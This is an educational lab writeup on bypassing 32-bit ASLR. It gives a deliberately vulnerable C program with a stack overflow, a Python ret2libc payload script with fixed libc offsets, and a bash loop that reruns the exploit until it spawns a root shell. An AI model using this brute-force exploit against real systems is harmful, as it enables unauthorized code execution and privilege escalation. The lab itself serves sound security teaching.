---
title: "ASLR Bypass via ret2libc Brute Force"
date: 2022-03-14
category: "aslr-bypass"
difficulty: "intermediate"
source: "INE"
tags: [INE, intermediate, aslr, ret2libc, brute-force]
excerpt: "When you can't leak an address, you can still win by guessing it. Defeating 32-bit ASLR by hammering a fixed ret2libc payload in a loop until the libc base lines up."
draft: false
---

> **Editor's note.** The original repository only contained a one-line
> placeholder ("Lazy writing report, so skip it :P") plus the working
> `vulnerable.c`, `exploit.py` and `run.sh`. This writeup reconstructs the
> full technique from those source files so the post stands on its own.
> The exploit logic shown here is exactly what those scripts do.

# 1. The idea

[ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)
randomizes the base address of libc on every run, which normally breaks a
static `ret2libc` chain — the address you hardcoded yesterday is wrong today.

On **32-bit** Linux the entropy is small. The libc base only has a limited
number of possible values, so a fixed payload built for *one* guessed base
will eventually line up if you simply run the program in a loop. No info leak
required — just patience and a `while true`.

This is the classic trade-off: ASLR makes exploitation *probabilistic*, not
*impossible*, on low-entropy targets.

# 2. The vulnerable program

```c
#include <stdio.h>
#include <unistd.h>

int overflow(){
    char buffer[500];
    int userinput;
    userinput = read(0, buffer, 700);
    printf("\nUser provided %d bytes. Buffer content is: %s\n", userinput, buffer);
    return 0;
}

int main(int argc, char *argv[]){
    overflow();
    return 0;
}
```

`read(0, buffer, 700)` writes up to 700 bytes into a 500-byte stack buffer —
a textbook overflow with ~200 bytes past the buffer to reach the saved return
address.

Compile it the usual lab way (NX on, stack protector off, 32-bit), and leave
ASLR **enabled** this time — that's the whole point:

```sh
$ gcc -m32 -fno-stack-protector vulnerable.c -o vulnerable
$ cat /proc/sys/kernel/randomize_va_space   # expect: 2 (full ASLR)
```

# 3. Building the fixed ret2libc payload

We pick *one* plausible libc base and build a standard
`system() / exit() / "/bin/sh"` chain against it. The offsets below are the
ones from this lab's libc:

```python
#!/usr/bin/python2
from struct import pack

libc_base = 0xf7ccc000          # one fixed guess
system    = libc_base + 0x45000  # system()
exit      = libc_base + 0x37950  # exit()
arg       = libc_base + 0x18c338 # pointer to "/bin/sh"

buf  = "A" * 516                 # padding up to the saved EIP
buf += pack("<I", system)        # return into system()
buf += pack("<I", exit)          # system() returns here -> clean exit()
buf += pack("<I", arg)           # argument: address of "/bin/sh"

print(buf)
open('payload.txt', 'wb').write(buf)
```

The offset `516` is the distance from the start of `buffer` to the saved
return address (found once with a cyclic pattern in GDB, with ASLR
temporarily off). The libc internal offsets (`system`, `exit`, the
`/bin/sh` string) are constant *relative to the libc base* — only the base
itself moves under ASLR.

# 4. Brute forcing the base

Because the payload is fixed but the real libc base changes each run, we
simply keep firing until our guessed base happens to match:

```bash
#!/usr/bin/bash -p
while true;
do
  (./exploit.py ; echo id; echo ls) | ./vulnerable | grep 'uid' -A 10 | tr 'A' ' ' ;
done
```

What this does on each iteration:

1. `./exploit.py` regenerates the fixed payload and pipes it in.
2. `echo id; echo ls` are queued as commands for the shell we hope to spawn.
3. If the randomized libc base **matches** our guess, `system()` runs with
   `/bin/sh`, the queued `id`/`ls` execute, and `grep 'uid'` catches the
   output — a visible hit.
4. If it doesn't match (the common case) the program just crashes and the
   loop tries again.

On 32-bit, a hit typically lands within seconds to a couple of minutes.

```text
$ ./run.sh
...
[ many crashes ] ...
  uid=0(root) gid=0(root) groups=0(root)
  exploit.py  payload.txt  run.sh  vulnerable  vulnerable.c
```

When you see the `uid=...` line, the guessed base lined up and the chain
executed.

# 5. Takeaways

- **ASLR ≠ exploit-proof.** On low-entropy 32-bit targets a fixed payload
  in a loop is a complete bypass.
- **64-bit changes the game.** The entropy there makes blind brute force
  impractical — you generally need an info leak (see
  [Lab 3 — ret2libc + ASLR Bypass via Info Leak](/writeups/ret2libc-aslr/)).
- The reliable, deterministic approach is leaking an address rather than
  guessing it; brute force is the fallback when you have no leak primitive.

## References

- [ret2libc fundamentals](/writeups/nx-bypass-ret2libc/)
- [ASLR — Wikipedia](https://en.wikipedia.org/wiki/Address_space_layout_randomization)
